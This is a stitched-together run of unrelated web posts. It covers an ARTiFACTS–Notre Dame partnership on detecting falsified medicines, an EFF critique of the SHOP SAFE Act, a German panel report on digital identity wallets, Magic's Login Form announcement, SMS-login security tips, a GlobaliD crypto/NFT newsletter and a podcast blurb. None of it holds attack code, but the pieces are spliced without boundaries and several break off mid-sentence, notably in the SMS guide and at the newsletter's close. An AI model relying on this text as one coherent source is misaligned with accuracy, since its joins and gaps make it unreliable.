<p>This is a global problem that is growing as supply chains become more complex with multiple steps in distribution compounded by the rise in online sales of pharmaceuticals.&nbsp;</p>
<p>So, we’ve partnered with the Distributed Pharmaceutical Analysis Lab (<a href="https://padproject.nd.edu/get-involved/distributed-pharmaceutical-analysis-lab/">DPAL</a>) of the <a href="https://science.nd.edu/">University of Notre Dame</a> to reduce the damage to public health from substandard or falsified drugs by speeding up and expanding the process whereby they are identified.&nbsp;</p>
<p>This partnership will harness our <a href="https://artifacts.ai/how-it-works/">Web 3.0 technology</a> to:</p>
 
 Make all relevant information directly available online for researchers and regulatory authorities&nbsp; 
 Create a trusted and secure chain-of-custody of drug samples and their metadata&nbsp; 
 Scale-up across the DPAL participant community&nbsp; 
 Deliver actionable findings that contribute to improved public health outcomes 
 
 Void of authority for post-market surveillance&nbsp; 
<p>Currently, there is no single global authority for monitoring the quality of generic medicine. And this lack of post-market, sustained and scaled system for collecting, testing, analyzing and providing real-time feedback to public authorities, distributors, and manufacturers hurts everyone. &nbsp;Study after study reveals pervasive poor quality and products that are worthless or even harmful to patients. Many countries in the developing world do not have the technological infrastructure or regulatory resources to keep low quality medicines off the shelves. And since the pharmaceutical trade is a lucrative global market, low quality medicine can cross borders and harm people anywhere in the world.</p>
<p>This is why ARTiFACTS has teamed up with the DPAL program at Notre Dame. Together, we will make the process of managing and conducting post-market surveillance more efficient: helping to reduce the prevalence of fake drugs in the market. The partnership will provide the framework to accelerate testing of samples collected which is necessary to expand the coverage of countries and products that can be analyzed.&nbsp;</p>
 How did we get here?&nbsp; 
<p>A major factor that allows substandard or falsified drugs to penetrate supply chains across the developing world is the scarcity of regulatory and laboratory resources to conduct effective post-market surveillance. In 2014, the University of Notre Dame formed the Distributed Pharmaceutical Analysis Lab (DPAL) to expand testing of pharmaceutical dosage forms sourced directly from local pharmacies in participating countries.</p>
<p>DPAL provides high quality, validated&nbsp; chemical analysis of pharmaceutical samples from partners in the developing world.&nbsp; In collaboration with Chemists Without Borders DPAL uses analytical resources at academic institutions in the US to perform characterization of suspect medications that have been collected and screened in Kenya, Uganda, Tanzania, India, Nepal, or Malawi.</p>
<p>Made up from a network of 29 academic institutions across the US and around the world, DPAL has invented and successfully deployed a low-cost screening tool used in the field for processing thousands of samples to date. Paper analytical devices (PADs) are test cards that can quickly determine whether a drug tablet likely contains the correct medicines. They are cheap and easy to use, and don’t require power, chemicals, solvents, or any expensive instrument: so they can be deployed rapidly at large scale wherever a problem with pharmaceutical quality is suspected.</p>
<p>Following this initial success, and to further their mission to remove substandard or falsified drugs from LMICs markets, DPAL is now looking to scale up in order to gather more data, better understand statistical significance, and provide faster – even real-time – feedback to authorities to impact public health. The ARTiFACTS system will efficiently capture and record the physical location and scientific metadata produced as tasks are performed throughout the analysis cycle, enabling a dramatic step-up of the volume of samples processed.</p>
 No time to waste – why scaling up matters&nbsp; 
<p>Around the developing world governments, health departments and universities are working together to tackle this crisis with the ultimate goal of eliminating fake drugs from the market. But to achieve this, it’s first critical to understand where and how these drugs are getting to consumers in the first place.&nbsp;</p>
<p>The hunt for falsified prescription drugs begins at pharmacies across the developing world. Secret shoppers sent out by local universities collect samples which are returned to the labs for initial testing. The samples and their results are recorded, bagged, and tagged – and separated into two groups. One set of samples will stay in-country and be sent to the relevant National Public Health Authority, and the other will be shipped over to the Lieberman Lab at the University of Notre Dame, where further tests are conducted and the results reported back to the relevant National Public Health Authority.&nbsp;</p>
<p>Through this <a href="https://www.prnewswire.com/news-releases/new-initiative-launches-to-attack-problem-of-substandard-generic-drug-distribution-301404185.html">partnership with ARTiFACTS</a>, University of Notre Dame and the DPAL community will be able to reach more countries, assess more samples, and more efficiently deliver results to public health bodies in-country. Operating at scale will allow the DPAL research to improve public health outcomes by contributing meaningfully to post-market surveillance of pharmaceuticals in LMICs and beyond.&nbsp;</p>

<p>America’s leading non-profit privacy advocate, the Electronic Frontier Foundation (<a href="https://www.eff.org/deeplinks/2021/09/shop-safe-another-attempt-fix-big-tech-will-mostly-harm-small-players-and">EFF</a>) has slammed the&nbsp;<a href="https://www.congress.gov/bill/116th-congress/house-bill/6058?q=%7B%22search%22%3A%5B%22SHOP+Safe+Act%22%5D%7D&amp;s=1&amp;r=1">SHOP SAFE Act</a>&nbsp;before Congress as good in theory but fairly ridiculous in practice, especially for privacy.</p>



<p>The EFF calls out as a significant privacy risk the proposed requirement to have ecommerce platforms verify the identity, address and contact information of any third party seller who uses their services. It argues that requiring a seller of any good online, including used goods (think mom and dad running a garage sale) to send their driver’s license or other government ID to the platform before making a listing unnecessarily exposes their&nbsp;<a href="https://anonyome.com/2020/05/what-constitutes-personally-identifiable-information-or-pii/">personal information</a>&nbsp;to the platform. And given the broad nature of the Bill, the selling platform in this case could be anything from eBay, Amazon, Facebook and Craigslist to Gmail and other email providers if the seller decides to make the sale via email (e.g. if they sell a used bike to a colleague using email).&nbsp;</p>



<p>“Imagine if you had to provide a copy of your driver’s license to Craigslist just to advertise your garage sale or sell a used bike. As over the top as that seems, it’s even worse when you think about how this would apply to services like Gmail or Facebook. Should you really have to provide ID to open an email account, just in case you sell something using it? Requirements like this threaten not only competition but user privacy, too,” the EFF writes.</p>



<p>The bipartisan Stopping Harmful Offers on Platforms by Screening Against Fakes in E-Commerce (SHOP SAFE) Act was&nbsp;<a href="https://judiciary.house.gov/news/documentsingle.aspx?DocumentID=4566">introduced</a>&nbsp;to Congress in March 2020 to protect consumers from the online sale of harmful counterfeit products. If the Bill passes, online marketplaces could be held liable for injury and damages suffered from these products. The way around being held liable is if the third party seller can be served a lawsuit in the United States or the platform meets 10 requirements before the counterfeit item is sold. The first of the 10 requirements is that the platform has “verified the identity, place of business, and contact information of third-party seller against governmental and other reliable sources.” Another requirement is that the platform has “conspicuously displayed the seller’s place of business, contact information, and identity along with manufacture location and shipping origin of the goods.” You can see the privacy risks to the mom and dad just wanting to offload some old books and clothes.</p>



<p>The Bill aims to offer ecommerce platforms incentives for more thoroughly checking third party sellers and hold those platforms liable for allowing dangerous counterfeits (e.g. a toy that breaks down and becomes as health hazard) to be sold. But while the&nbsp;<a href="https://www.eff.org/deeplinks/2021/09/shop-safe-another-attempt-fix-big-tech-will-mostly-harm-small-players-and">EFF</a>&nbsp;says protecting the consumer from dodgy products is a noble goal, it’s a case of hurting the consumer with a law that’s meant to help them.&nbsp;</p>



<p>Some&nbsp;<a href="https://www.redpoints.com/blog/everything-you-should-know-about-the-shop-safe-act/">commentators</a>&nbsp;say the SHOP SAFE Act has little chance of passing into law unless the increase in cybercrime and counterfeit products seen during the pandemic prompts lawmakers to tighten the screws.&nbsp;</p>



<p>From our perspective, this Bill is yet another challenge in the ongoing battle to protect consumer privacy, but we can offer some protection through&nbsp;<a href="https://mysudo.com/">MySudo</a>. Sure, there would be no way around having to submit a verifiable name and address via government ID, but using a MySudo phone number and email address instead of their personal details when they contact the ecommerce platform at least limits the amount of personal information they expose. Check out&nbsp;<a href="https://mysudo.com/2020/10/mysudo-private-secure/">MySudo</a>&nbsp;consumer app and&nbsp;<a href="https://sudoplatform.com/">Sudo Platform</a>&nbsp;for delivering the same types of capability to customers.&nbsp;</p>

 Eine Diskussionsrunde zum Thema ,,Digitale Identitäten” warf vor allem Fragen nach Datensicherheit und Kosten einer Wallet auf, sowie dem Umgang mit Skeptiker:Innen. 



<p>Das Thema ,,Digitale Identitäten’’ ist so aktuell wie nie zuvor, besonders vorangetrieben durch die Corona-Pandemie und die damit verbundene zunehmende Digitalisierung in nahezu allen Lebensbereichen. Dabei rückt jedoch auch die Frage nach der ,,Selbst-Souveränen Identität’’ in den Mittelpunkt, kurz SSI. Unter diesem Thema fand auch die online Veranstaltung ,,Digitale Identität’’ des BFM (Betriebswirtschaftliches Forschungszentrum) am 20. Oktober 2021 statt. Während einer angeregten Diskussionsrunde stellten sich vor allem die Themen der Datensicherheit, Umgang mit Skeptiker:Innen, und Kosten für eine Wallet in den Mittelpunkt.&nbsp;</p>



<p>Unter der Expertengruppe befanden sich Irene Adamski als Vertreterin von Jolocom, sowie Fabiane Völter als Wissenschaftliche Mitarbeiterin der Uni Bayreuth, Thomas Ruch als Zuständiger für die Kreditsteuerung der BAUR GmbH und Boris Lingl als Head of Blockchain bei DATEV, welche die Fragen des Publikums zu beantworten suchten.&nbsp;</p>



<p>Eine Brieftasche im Physischen. Eine einzige Identität, die man über mehrere Domänen hinweg verwendet, verspricht niedrige Komplexität und Unabhängigkeit von Intermediären, sprich die Identität liegt nicht bei Dienstleistern, sondern bei den Nutzer:Innen selbst. Damit ist SSI als ein Mittelweg zu sehen, welcher die Vorteile der Isolierten und Föderierten Identität zu verbinden sucht. Ein Anwendungsbeispiel sei Folgendes: Man kann über diesen Ansatz einzelne Informationen weitergeben, beispielsweise der Bank mitteilen, dass man über 60000€ verdient – jedoch nicht den genauen Betrag. So bleibt die Kontrolle der Daten stets bei den Nutzer:Innen einer Wallet. Als eine ,,Brieftasche im Physischen’’ kann man diesen Ansatz verstehen, aus welcher man einzelne Karten zückt, die einzelne benötigte Informationen herausgeben. Weitere Beispiele für die Anwendung einer Wallet sind z.B. Ummeldungsprozesse, Tickets in Öffentlichen Verkehrsmitteln, oder eben Nachweise über Einkommen. So ist eine Wallet gewissermaßen ein Zusatz für die basis ID.&nbsp;</p>



<p>Better safe than sorry – Datensicherheit bei der Wallet. Doch wie sieht es mit der Datensicherheit aus? Wie sicher ist eine Wallet wirklich? Kurz lässt sich sagen, dass dies immer in den Händen der Nutzer:Innen liegt. Im Falle einer Anfrage, etwas auszuweisen, können diese selbst an- und abwählen, welche Informationen sie teilen, oder es sogar komplett ablehnen. Die eigenen Daten liegen dabei allesamt verschlüsselt auf der eigenen Wallet. Ähnlich wie bei einer Brieftasche zieht man nur jene Informationen heraus, die man auch teilen möchte.&nbsp;&nbsp;</p>



<p>Dies beantwortet jedoch nicht die Frage nach der Fälschungssicherheit. Eine falsche Identität wird zunächst durch die digital signierten Nachweise (Credentials) ausgeschlossen. Über Credentials kann der Verifizierer (z.B. BAUR) nachvollziehen, ob der Signaturschlüssel tatsächlich vom Landesamt kommt. Standardisierungsgremien sichern, dass keine falschen Identitäten angenommen werden, um Sachen anzufragen. So muss das Siegel original und geprüft sein.&nbsp;</p>



<p>Alle sollen mitgenommen werden. Ein zentrales Thema während der Diskussion, auf welches auch stets verwiesen wurde, war die Notwendigkeit einer Schulung oder Aufklärung der Nutzer:Innen. Zum einen darüber, nicht alle Daten mit allen teilen zu müssen, selbst wenn hierzu aufgefordert wird. Zum anderen vor allem im Umgang mit Skeptiker:Innen. Alle Bürger:Innen sollen mitgenommen werden, und Lösungen müssen parallel angeboten werden, um niemanden auszuschließen. Einigkeit herrschte darüber, dass das Nutzen einer Wallet freigestellt werden soll. EU Bürger:Innen müssen aber die Möglichkeit haben, eine Wallet zur Verfügung gestellt bekommen zu haben. Daher kam der Begriff einer Übergangszeit auf, mit der definitiv zu rechnen sei.&nbsp;</p>



<p>SSI als globaler Trend. Noch steckt die Anwendung der Wallet in den Kinderschuhen. Doch die Corona-Pandemie hat den Vorteil eines Digitalisierungsschubes gebracht und Bürger:Innen bereits an das Nutzen eines QR Codes gewöhnt. In fünf Jahren, so wurde der Ausblick in der Diskussion gegeben, soll dies bereits weitgehend normalisiert sein. Erste Rollouts könnten bereits in zwei Jahren stattfinden, beispielsweise beim Einchecken in Hotels oder beim Studierendenausweis. Vor allem globale Trends zeigen die Wichtigkeit auf, sich mit dem Thema SSI zu beschäftigen. Dabei richtet sich ein Appell vor allem an Unternehmen, denen die Rolle zufällt, ihre eigenen Identitäten zu verwalten und voranzutreiben. Die technische Infrastruktur muss bereitgestellt werden, und Unternehmen werden damit gewissermaßen zu Vorreitern der Wallet. SSI, so lautete das Fazit, werde sich wie das Internet verbreiten.&nbsp;</p>



<p>Ein Markt im Werden. Nichtsdestotrotz handelt es sich um einen Markt im Werden. Daher konnte man auch die genaue Frage bezüglich der Kosten nicht vollständig beantworten. Festzuhalten ist jedoch, dass keine Kosten auf die Endnutzer:Innen der Wallet zukommen werden. Es zahlen die Parteien (Aussteller:Innen und Verifizierer:Innen), welche die Infrastruktur betreiben, doch diese Anfangsinvestitionskosten fallen nur für Forschung und Entwicklung an. Zusammenfassend bietet SSI großes Potential, da auch digitale Maschinen oder Organisationen diesen Ansatz nutzen können.&nbsp;</p>

<p>It feels so long ago that Magic unveiled its first auth solution in April 2020. JAMstack was having a moment, and so were NFTs. The world had just begun to reckon with shutdowns and social distancing. A surge in remote work showed us that online identity was overdue for a refactor. Centralized infrastructures were being challenged everywhere.</p><p>Back then, all it took was one line of code to implement Magic.</p><p>We used to hear lots of positive feedback about our whole developer experience. Those docs, you know? So&nbsp;clean.</p><p>A year since, the world of web development is again at a threshold. We’re inundated with feedback from users that want a multitude of sign-in options. They want to feel secure, they want to own their data. They desire convenience and seamlessness. Providing an auth experience that serves every user, no matter their technical acumen or accessibility needs, is a costly undertaking for app creators. That’s because building a Magic implementation never really was just one line-of-code. You still have to create buttons, composed into forms, connected to a server. Model user accounts, measure conversion rates, but wait… did I aria-label that button right? Hold on, we need a combobox? Now add social logins to the mix: what the heck is OAuth? Or WebAuthn? This login page is turning into infinite story&nbsp;points!</p><p>As we added more and more choices for sign-in, we heard feedback that Magic was harder to use, especially for no-code builders. So, what happened? And why should auth — something that every app needs — be so difficult to build and maintain? That’s a question that’s been bugging me for some time now. I lead the engineering team for developer experience at Magic, so we aimed to set a new standard to help our customers build auth more quickly, more securely, more accessibly, and more user friendly-y.</p> Occam’s auth <p>The aha moment came from the simple realization that most modern auth flows follow a discrete pattern: authorization and callback. You prompt a user to authorize themselves, traditionally with an email + password. Or, a more modern (<a href="https://medium.com/magiclabs/passwords-suck-6524a8e7aeb5">and more secure</a>) approach would use social logins, or Magic’s own passwordless email/SMS flows. Once a user has submitted their proof-of-identity (“authorization”), the app has to then verify this information (“callback”). In the case of social logins, this requires checking a one-time code built around some fancy, math-y cryptographic stuff. Or, using Magic’s passwordless SDKs, you just call getRedirectResult for social logins and loginWithCredential for email/SMS. Building auth for the web essentially boils down to two big function calls. Noticing this, however, presents an opportunity to do what we engineers love to do best: abstract!</p><p>But we weren’t going to make just any abstraction.</p><blockquote>We want a new paradigm that speaks to the power of web development today and uses web primitives in such a way that the solution can slot into just about any tech&nbsp;stack.</blockquote><blockquote>We’re especially excited about no-code and low-code platforms like Webflow and Bubble, so we made it a priority to support those tools as natively as possible.</blockquote> Introducing (truly) plug &amp; play&nbsp;auth <p>Today, we’re introducing a new way to implement Magic auth for the web: Magic Login&nbsp;Form.</p><p>We think it delivers on the promise of Magic as the easiest, most flexible, and most extensible auth solution available. That’s because we want your frontend implementation to be as simple as copy &amp;&nbsp;paste.</p><p>Everything you need to start securely authenticating your users with any of Magic’s sign-in methods is two &lt;script&gt; tags&nbsp;away:</p><p>That’s all it takes to connect your app to Magic’s entire suite of auth features. You get a beautiful, accessible login screen with UI best-practices built-in — we’ll even remember which auth method users previously signed-in with. And better yet, your implementation is future-proof and automatically updates with Magic’s service. So, when Magic adds support for your favorite social login provider, you don’t need to deploy an update. Your users will see the latest changes automatically. All of this happens inside of an &lt;iframe&gt; hosted on your domain, so users aren't left questioning what service they're interacting with, reducing the risk of phishing.</p>An example of a fully-branded Magic Login&nbsp;Form<blockquote>At Magic, we think developer experience is user experience.</blockquote><p>So we’re trying to remove as many barriers between you and your creativity as possible. With Login Form, you can stop worrying about auth and start focusing on what matters to your users and your business. Though it’s still not quite “one line of code” for everything auth, it’s a hell of a lot closer than we’ve seen anywhere else, and we’re excited about its potential to improve the auth experience for everyone on the web, long into the&nbsp;future.</p> The first prototype <p>At Magic, we promote a culture of creative experimentation, and we put this into practice during bi-weekly “demo days.” Everyone on the team has an opportunity to share something they’re working on — whether it’s related to a milestone project, or just a blossoming idea. Some of our best features sparked this way, usually based on pure intuition and user empathy. This takes a lot of introspection as a team. If we’re knowledgable of ourselves, it tends to manifest in great products for our users. So, demo day is also an opportunity for us to invest in each&nbsp;other.</p><p>When Login Form made its first appearance at demo day — unplanned and off-the-cuff — it looked like&nbsp;this:</p><p>The inspiration for that demo had simmered for a while. When we talked about this “big idea,” to make auth simple and clean and future-proof, it was sandwiched between phrases like “pie-in-the-sky” and “someday…” But, to produce that working proof-of-concept was a matter of hours (it helps, of course, <a href="https://www.youtube.com/watch?v=7s664NsLeFM">that we already had a universe in which to bake our apple&nbsp;pie</a>).</p><p>Demo day was a hit, but that’s only where the real work&nbsp;began.</p> The “real”&nbsp;work <p>For the developer experience team, Login Form meant so much more than a pre-packaged UI. It represented a whole new, opinionated implementation approach. Building a login page is pretty easy to “get”, even if you’re not an engineer. We’ve seen a thousand login pages before. But we still had to explain this implementation approach in a way that our product designers and marketing extraordinaries could relate to — we needed to help them tell a story. So, we went back to the drawing&nbsp;board.</p>Snapshots from the UI design&nbsp;process<p>It didn’t take long to find consensus on a UX pattern. Again, it’s a login page (a damn good login page). We started with a few design&nbsp;goals:</p>  Login Form should be adaptive to a developer’s Magic Dashboard settings, creating a seamless development experience. If you add some Google creds to your Magic account, then Login Form should instantly reflect&nbsp;that.  Logging in should be quick, easy, and frictionless — users should never feel lost in sea of sign-in options. So, we want to remember what sign-in method a user has previously used for an app, then we can focus them on the right form automatically.  Good design is inclusive design. Our entire login experience should reflect UI best practices and accessibility standards, above and beyond simple compliance.  The design should be extensible. While we’re super proud of our initial release, we’re already thinking about ways to make Magic Login Form even better. Simplicity and flexibility help ensure we’ve got room to grow moving&nbsp;forward.   A new onboarding experience for developers <p>Magic Login Form represents a new onboarding experience for end-users, so we wanted to revamp our own onboarding experience for developers to match. Learning about auth can quickly derail any developer’s good day. Striking the balance between good UX and good security can just boggle the mind. Even building on top of a solution like Magic can quickly spiral into a thousand-thousand esoteric questions. UX tends to be the last box on the auth checklist. So, how do we show-off the “easy button”? We started by looking at our own sign-up experience on Magic Dashboard.</p><p>After you’ve completed our passwordless email flow for the first time, you see a screen like&nbsp;this:</p><p>When we created npx make-magic, we sought to speed-up development of new projects using Magic. When we added this screen to our sign-up flow, however, we saw a mixed response. Some, especially those from a JAMstack background, were happy to see familiar tooling options. Others were unsure about what npx make-magic was doing in their system, and why they were being asked to start there. One developer was confused upon seeing npx, thinking that Magic worked exclusively for the NodeJS ecosystem—an impression we wanted to correct. The easiest decision for us was to strike this page from our sign-up flow completely.</p><p>We replaced this piece of the onboarding puzzle with a new Login Form settings page. From here, developers can access an interactive preview of their customized form. We also introduced a new featured card to Magic Dashboard’s home page, surfacing this new implementation approach with a beautiful, eye-catching design.</p> Now what? <p>Getting started with Magic Login Form is super easy. <a href="https://dashboard.magic.link/">Log into your Magic Dashboard account</a> and go to Login Form. Try a demo for your very own plug &amp; play login page. You’ll also see a link to download a working implementation using your actual API&nbsp;keys!</p><p>We’ve also written some <a href="https://magic.link/docs/login-form">documentation</a> to help you build a plug &amp; play login experience from the ground up. And, of course, we have added a template to our CLI scaffolding tool to generate a working implementation in under a minute. Simply run the following command in your preferred shell:</p><p>npx make-magic --template plug-and-play</p> So long, and thanks for all the&nbsp;fish! <p>We hope you enjoyed this peek behind-the-curtain of the all-new Magic Login Form (fun fact: our internal code name was “Auth-in-a-box”). By the way, it’s totally free to try.

However, despite significant market adoption of a few operating systems, interoperable standards for messaging are rare, and often segmented.</p><p>SMS (Short Message Service) messaging¹, despite a number of material challenges, has broad adoption, international regulations, and support across platforms.</p><p>This post details the use of SMS as an authentication mechanism.</p> What is a high quality SMS login&nbsp;system?   Easy for Users, Hard for Attackers  Works globally, across all cellular carriers, even in lossy service environments.  Enrollment, opting out, and authentication are beautiful, simple processes.  Confidence the user has access to their phone, and the phone number is&nbsp;valid.  When users change their phone number, they don’t stop using the service; they can migrate to a new phone number smoothly.  When an attacker pretends to be a user, they are prevented from taking over the&nbsp;account.  A user should not be easily duped into helping their attackers.  Authentication is a two-way&nbsp;street SMS can be temporarily undeliverable <p>SMS delivery is not guaranteed, and many implementations provide no mechanism through which a sender can determine whether an SMS message has been delivered.</p><p>💡 Allow users to request a new code as part of the product.

Users will no longer receive messages.</p><p>In the United States, FCC affirms text messages are covered under the “<a href="https://www.fcc.gov/tags/telephone-consumer-protection-act-tcpa">Telephone Consumer Protection Act</a>”, and users have a variety of rights, including to&nbsp;Opt-Out.</p><p>💡 Notify users when their phone number is undeliverable: either in-app, or via&nbsp;email</p> Messages can come from unfamiliar sources <p>SMS standards make spoofing phone numbers difficult. However, no easy way exists for consumers to authenticate numbers or associate them with businesses. Messages appear with only a number to identify&nbsp;them.</p><p>Users are habituated to ignore sender ids, or react with suspicion when numbers are&nbsp;changed.</p><p>💡 Include information about the sender in your message “Your <a href="http://ACME.co">ACME.co</a> Code: 123–123”, or use Domain-Bound Codes</p> Users can be on fraudulent sites <p>Some sites trick users into entering authenticator codes for other sites. A common ploy asks for a user’s phone number, and prompts the user to enter the code they receive. The attacker simply forwards the collected code to the target, and successfully poses as the end&nbsp;user.</p>  User Logs in to Fraud Site.

Allowing paste makes your service more accessible, and a smoother end user experience.   Using numeric codes? Label your input box as `numeric`   Phone soft keyboards use information about the input box to render the most usable keyboard for the use case. Showing a numeric keypad helps make entering codes as easy as&nbsp;possible   Supporting iOS users? Tag login boxes with textContentType   Operating systems such as iOS make it easy to fill in one time codes from SMS messages. Apple uses a text content tag of textContentType=.oneTimeCode to allow users to auto-fill new SMS codes into the&nbsp;page.   Building with Google Play? Consider auto-verification with the SMS Retriever API   Android’s Google Play Services offer a collection of <a href="https://developers.google.com/identity/sms-retriever/overview">advanced SMS tools for verification</a> of SMS codes, including supporting background verification.  With the <a href="https://developers.google.com/identity/sms-retriever/overview">SMS Retriever API</a>, It is possible to build almost silent user and device verification, however, fallback support for traditional SMS is required, and informing users about what is occurring is critical for building user trust and&nbsp;comfort.   Building Web Applications? Use `autocomplete="one-time-code"`   Many browsers facilitate SMS message autofill through input code <a href="https://developers.google.com/android/work/play/emm-api/prov-devices">tags for autofill</a>, such as autocomplete="one-time-code". This can provide smooth user experiences cross-platform, and allow your product to take advantage of built-in browser functionality.

Why most NFTs are scammy cash&nbsp;grabs Cryptopunks, the original blue chip&nbsp;NFT<p>Along with DeFi and last week’s Bitcoin ETF, NFTs are certainly one of the defining crypto developments of 2021. Is it art? Is it the future of the creator economy? Is it just a&nbsp;JPEG?</p><p>GlobaliD software architect /spacemandev had <a href="https://twitter.com/spacemandev/status/1449814635939614722">a spicy tweetstorm on the&nbsp;subject</a>:</p><blockquote>Why most NFTs are a scammy cash grab and a potential model for NFTs that would make it less…scammy</blockquote><blockquote>NFTs have been hailed as a new way to empower creators, and while they provide a unique new tool on how to raise money for artists, their current trend as collectibles is…..well a speculative bubble at&nbsp;best</blockquote><blockquote>Traditionally, a creator inspired model is that of Patreon or Ko-Fi, where the patron pays money over an interval of time to get access to rewards from a creator over that period of&nbsp;time</blockquote><blockquote>NFT Collectibles posit that you can pay a creator upfront large sums of money and over time, they’ll what…return value to you because of what reason? Without interval monetary spends, there’s no incentive for a creator to stick&nbsp;around.</blockquote><blockquote>They can just do a cash grab of an initial sale, make politican like promises about “future” rewards, and have 0 consequences by not living up to&nbsp;them.</blockquote><blockquote>A potential model for NFTs that could side step this hurdle is to actually borrow from the ICO boom of yesteryear. After a creator does an initial NFT drop, create a holding contract for all the funds whose members are controllers of the&nbsp;NFTs.</blockquote><blockquote>Original $ + royalty $ all get spent into this contract. Then the DAO authorizes releases of funds to the creator over some time interval as they continue to stick around and build the community, with NFT resales continuously filling the fund, along with any further NFT&nbsp;sales</blockquote><blockquote>For the creator, they know that they have a market for their work, there’s X$ set aside *just for them* if they produce, and for the members of the DAO, they know the creator won’t just up and leave after the initial&nbsp;sale</blockquote><p>Food for&nbsp;thought.</p><p>Relevant:</p>  <a href="https://blockworks.co/galaxy-digital-affiliate-raises-325m-fund-for-nfts-interactive-gaming/?oly_enc_id=3914C9559689A4M">Galaxy Digital Affiliate Raises $325M Fund for NFTs, Interactive Gaming — Blockworks</a>  Via <a href="http://global.id/">/pstav</a> — <a href="https://www.coindesk.com/business/2021/10/19/coinbase-and-nba-sign-partnership-deal/">Coinbase and NBA Sign Partnership Deal</a>  <a href="https://www.coindesk.com/policy/2021/10/15/nfts-are-an-internet-game-changer/">NFTs Are an Internet Game-Changer</a>  <a href="https://www.theinformation.com/articles/jack-dorsey-s-mining-ambitions-steam-bans-nfts-a-bitcoin-etf-preps-launch?rc=wsoyyg">Jack Dorsey’s Mining Ambitions; Steam Bans NFTs; a Bitcoin ETF Preps&nbsp;Launch</a>  <a href="https://www.theblockcrypto.com/news+/120917/meet-the-former-parafi-capital-investor-betting-big-on-nfts">Meet the former ParaFi Capital investor betting big on&nbsp;NFTs</a>  <a href="https://decrypt.co/84121/reddit-building-nft-marketplace-ethereum-token-rewards">Reddit Building NFT Marketplace to Join Ethereum Token Rewards — Decrypt</a>   2. Tweet of the&nbsp;week <p><a href="https://twitter.com/AdamSacks/status/1450162259733491715">Adam Sacks</a> — via&nbsp;<a href="http://global.id/easwee">/easwee</a>:</p> 3. How Bonifii x GlobaliD x Indicio enhance financial inclusion <p>From <a href="https://bonifii.com/2021/10/bonifii-increases-financial-inclusion-with-globalid-digital-wallet-and-indicio-network/">the announcement</a>:</p><blockquote>Bonifii, the financial industry’s first verifiable exchange network for financial cooperatives, today announced the Bonifii credential, a decentralized digital identity that provides underserved individuals with access to traditional banking services in a way that maximizes their privacy and security. Bonifii created the digital credential in partnership with GlobaliD, a trust platform and digital wallet. The credential is underpinned by the Indicio Network, a global network built on Hyperledger Indy for decentralized digital identity using distributed ledger technology (DLT).</blockquote><blockquote>The Bonifii credential transforms the way new accounts are created by streamlining the delivery of information needed to open an account at a traditional financial institution. By enabling an end-to-end digital online application process, the credential offers a secure and meaningful entry point into accounts with financial institutions for millions of underbanked people, giving them a pathway to achieving financial stability.</blockquote><blockquote>“Now, financial institutions that use the Bonifii credential can achieve higher levels of assurance than traditional application methods. The identity of the account applicant can be verified from a variety of attributes that create trust and assurance,” said John Ainsworth, CEO and President of Bonifii. “This type of digitally verifiable KYC reduces fraud, increases financial inclusion, and provides friction-free interactions between account holders and financial institutions.”</blockquote><p>In the context of inclusion and interoperability, the vision here is super exciting. Individuals will be able to open an account with a credit union using a simple, universal credential that can later also be accepted by other financial institutions as it satisfies basic compliance requirements for account&nbsp;opening.</p><p>And because the credential is built on self-sovereign identity, there’s huge potential to reach those currently out of reach of the traditional banking&nbsp;system.</p> 4. Chart of the&nbsp;week <p>Speaking of Patreon — from <a href="https://www.theinformation.com/articles/podcasters-rule-on-patreon-chart-li-jin-joins-a-crypto-firm?rc=wsoyyg">The Information’s Creator Economy newsletter</a>:</p><p><a href="https://www.theinformation.com/articles/podcasters-rule-on-patreon-chart-li-jin-joins-a-crypto-firm?rc=wsoyyg">The Information</a>:</p><blockquote>This shows how well the company has sustained the boost in usage it had early in the pandemic. In March last year, Patreon said more creators had joined the platform than any month in its entire history. In January this year, it said it was generating $100 million in annualized revenue, which it earns by taking a cut of creators’ monthly incomes on the&nbsp;site.</blockquote><p>Established creators are running with the subscription model. What will they do with&nbsp;NFTs?</p><p>Also, a crazy stat from&nbsp;Axios:</p><blockquote>The internet employs almost as many creators (200,000 full-time equivalent jobs) as the rest of the U.S. entertainment industry represented by the largest&nbsp;unions.</blockquote> 5. Hard Yaka portfolio company Forge is having a banner&nbsp;year <p>Here’s <a href="https://www.linkedin.com/feed/update/urn:li:activity:6858017118827479040/">True Global Ventures</a>:</p><blockquote>Forge’s total revenue grew 306% to $68.1M for the six months ended June 30, 2021, compared to the six months ended June 30, 2020; Placement fee revenues for Forge Markets, Forge’s private share trading platform, grew 291% to nearly $58 million, up from $14.8 million in the same period, while volume increased 203% in the period to $1.68&nbsp;billion!</blockquote><blockquote>This of course comes as great news as Forge recently unveiled its intent to go public, in a proposed merger with Motive Capital Corp, a SPAC sponsored by affiliates of Motive Partners. The proposed transaction values Forge at around $2 billion and is expected to be completed earliest in Q4&nbsp;2021!</blockquote> 6.

Description: As we move through Season Two of Hello User and pull apart top cybersecurity themes and myths around cybersecurity, we welcome Candace Worley, Chief Product Officer for Ping Identity. Candace shares some key takeaways from her time at Ping, along with McAfee and a short stint at Amazon. She talks about what it takes to run a mission-critical solution for companies, the changes she has seen in the industry, and how we can prepare against the innate trusting nature of humans. &nbsp; Key Takeaways: [1:55] Throughout her long tenure in cyber, what changes hasCandace seen in hackers, vendors, and the response companies have to attacks? What were the benefits of working for a company that had a very large footprint in the enterprise space? [3:40] Candace and Richard give their take on the intention behind founders building security solution companies. Is it for the revenue? The security? Or maybe a mix of both. [7:19] Candace talks about the switch companies go through from being security first to software, and the typical implications and expectations that go along with that switch. [13:50] Candace feels there are two things at the core of security: data and identity. [14:30] While working as the Chief Strategist at McAfee, it became clear to Candace that if you have a really strong identity practice in place that is integrated into that security stack, your ability to mitigate the risk of material cyber-attacks is pretty good. [17:41] Where have we fallen down as an industry? [22:50] The fundamental issue in cyber security is that humans are innately trusting. [23:28] Why is Candace fascinated by the idea of moving towards risk-based identity? &nbsp; Quotes: •“Most security solutions founders see a problem that has a potential revenue opportunity associated with it.” —Richard   •“If you get your identity wrong, you’d better pray you got the rest of your cyber stack pretty bulletproof, because you just left the front door unlocked.” —Candace •“Vulnerabilities are sexy, yet identity is day-to-day work, and it takes a tremendous amount of effort.” —Richard •“The fundamental issue in cyber security is that humans are innately trusting.” —Candace &nbsp; Mentioned in This Episode: •Candace Worley •Ping Identity

